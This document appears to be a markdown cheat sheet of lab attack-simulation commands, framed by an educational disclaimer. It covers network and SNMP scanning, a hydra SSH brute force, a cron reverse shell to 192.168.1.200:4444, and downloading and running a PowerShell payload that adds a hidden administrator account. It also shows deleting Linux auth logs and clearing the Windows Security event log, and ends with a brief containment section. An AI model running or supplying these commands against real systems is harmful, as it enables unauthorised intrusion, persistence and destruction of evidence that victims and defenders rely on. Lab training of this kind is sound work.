
# Attack Simulation Commands

## Disclaimer

These commands are provided strictly for educational and defensive cybersecurity simulations inside isolated lab environments.

Do not use these techniques against systems you do not own or have explicit authorization to test.

---

## Reconnaissance

```bash
# Discover live hosts
sudo netdiscover -r 192.168.1.0/24

# Scan FortiGate ports
sudo nmap -sS 192.168.1.100

# snmp scan
sudo nmap -sU -p 161 --script snmp-brute 192.168.1.100

# Enumerate SNMP
snmpwalk -v2c -c public 192.168.1.100
```

---

## SSH Brute Force Simulation

```bash
# SSH brute force against Ubuntu endpoint
hydra -l user1 -P passwords.txt ssh://172.16.10.2

# Login after successful attack
ssh user1@172.16.10.2
```

---

## Privilege Escalation

```bash
# Check sudo permissions
sudo -l

# Open sudoers file
sudo nano /etc/sudoers

# Switch to root
sudo su
```

Example sudoers entry:

```text
user1 ALL=(ALL:ALL) ALL
```

---

## Linux Persistence

```bash
# Edit cron jobs
crontab -e
```

```bash
# Reverse shell persistence
@reboot bash -c 'bash -i >& /dev/tcp/192.168.1.200/4444 0>&1'
```

---

## Windows Lateral Movement

```bash
# Start temporary HTTP server
python3 -m http.server 8080
```

```powershell
# Download PowerShell payload
Invoke-WebRequest -Uri "http://172.16.10.2:8080/update5.ps1" -OutFile "C:\Users\Public\update5.ps1"

# Execute payload
powershell -ExecutionPolicy Bypass -File C:\Users\Public\update5.ps1
```

Example payload:

```powershell
# Create hidden admin account
net user hacker_123 123 /add
net localgroup administrators hacker_123 /add
```

---

## Defense Evasion Simulation

```bash
# Linux log deletion simulation
sudo rm -rf /var/log/auth.log
```

```powershell
# Clear Windows event logs
wevtutil cl Security
```

---


## Incident Containment

```bash
# Block attacker IP
sudo iptables -A INPUT -s 192.168.1.200 -j DROP

# Lock compromised user
sudo passwd -l user1
```

```powershell
# Delete malicious Windows account
net user hacker_123 /delete
```

